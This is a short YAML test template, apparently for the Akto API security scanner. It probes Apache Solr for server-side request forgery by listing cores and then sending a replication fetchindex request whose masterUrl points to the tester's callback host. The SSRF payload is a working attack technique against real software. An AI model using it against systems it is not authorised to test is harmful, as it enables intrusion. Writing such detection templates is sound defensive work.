api_selection_filters:
  method:
    neq: "OPTIONS"
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
  url:
    extract: urlVar
  request_headers:
    for_one:
      key:
        eq: "host"
      value:
        extract: hostHeaderVal

execute:
  type: multiple
  requests:
    - req:
        - modify_url: "/solr/admin/cores"
        - add_query_param:
            wt: json
        - modify_method: GET
        - replace_body: '{}'
        - validate:
            response_payload:
              for_one:
                key:
                  eq: name
                value:
                  extract: nameVar
        - success: x2
        - failure: exit
    - req:
        - modify_method: GET
        - modify_url: "/solr/${nameVar}/replication/"
        - send_ssrf_req:
            url: "https://test-services.akto.io/store_uuid/${random_uuid}"
        - add_query_param:
            command: fetchindex
        - add_query_param:
            masterUrl: "https://test-services.akto.io/${random_uuid}"
        - replace_body: '{}'
        - validate:
            response_payload:
              contains_all:
                - "<str name=\"status\">OK</str>"
            ssrf_url_hit: ${random_uuid}
        - success: vulnerable
        - failure: exit
